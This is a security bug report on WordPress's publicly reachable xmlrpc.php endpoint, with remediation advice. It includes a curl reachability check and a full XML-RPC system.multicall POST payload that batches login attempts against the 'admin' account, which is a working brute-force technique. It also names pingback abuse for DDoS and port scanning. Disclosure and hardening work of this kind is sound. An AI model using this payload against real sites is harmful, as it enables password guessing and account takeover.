### 🐞 Bug Report: Abuse of `xmlrpc.php` in WordPress

**Reported By:** Raghav Arora  
**LinkedIn:** [https://www.linkedin.com/in/iamraghavarora](https://www.linkedin.com/in/iamraghavarora)  
**Severity:** High  
**Date Reported:** 2025-06-16

---

### 📄 Summary

The `xmlrpc.php` endpoint in WordPress is enabled and accessible to unauthenticated users. This legacy API allows external systems to communicate with WordPress and can be exploited for **brute-force attacks**, **DDoS amplification**, and **pingback-based port scanning**.

---

### 📌 Affected Component

- File: `/xmlrpc.php`
- Default WordPress XML-RPC API

---

### 🚨 Proof of Concept (PoC)

**Step 1: Test Accessibility**

```bash
curl -I https://<target-site>/xmlrpc.php
```

**Expected Output:**

```
HTTP/1.1 200 OK
```

**Step 2: Brute-force Attack Using system.multicall**

The following POST request can attempt multiple logins with a single HTTP request:

```xml
POST /xmlrpc.php HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
  <param>
    <value>
      <array>
        <data>
          <value>
            <struct>
              <member>
                <name>methodName</name>
                <value><string>wp.getUsersBlogs</string></value>
              </member>
              <member>
                <name>params</name>
                <value>
                  <array>
                    <data>
                      <value>
                        <array>
                          <data>
                            <value><string>admin</string></value>
                            <value><string>wrongpassword</string></value>
                          </data>
                        </array>
                      </value>
                    </data>
                  </array>
                </value>
              </member>
            </struct>
          </value>
          <!-- Repeat struct with different passwords -->
        </data>
      </array>
    </value>
  </param>
</params>
</methodCall>
```

---

### 🎯 Impact

- **Brute-force amplification:** Multiple password attempts in a single request evade rate limiting.
- **DDoS attacks:** Used in XML-RPC pingback attacks to overload target servers.
- **Port scanning:** Abused via `pingback.ping` method to scan internal network ports.

---

### 🛠️ Suggested Remediation

- **Disable `xmlrpc.php`** if not actively used by third-party apps or integrations:
  - Add this to `.htaccess`:

    ```apache
    <Files xmlrpc.php>
        Order Deny,Allow
        Deny from all
    </Files>
    ```

- Use security plugins like **Wordfence** or **iThemes Security** to block or monitor XML-RPC usage.
- **Switch to REST API** for modern integrations and disable XML-RPC.

---

### 🔒 Security Best Practices

- Regularly audit endpoints that expose remote functionality.
- Disable legacy APIs unless explicitly required.
- Monitor logs for unusual XML-RPC request patterns.

---

### 🙏 Note to Security Team / Developers

Though XML-RPC was originally added for integration flexibility, its continued presence introduces substantial risk, especially on public-facing WordPress installations. Its deprecation or restriction is highly recommended unless in active use.
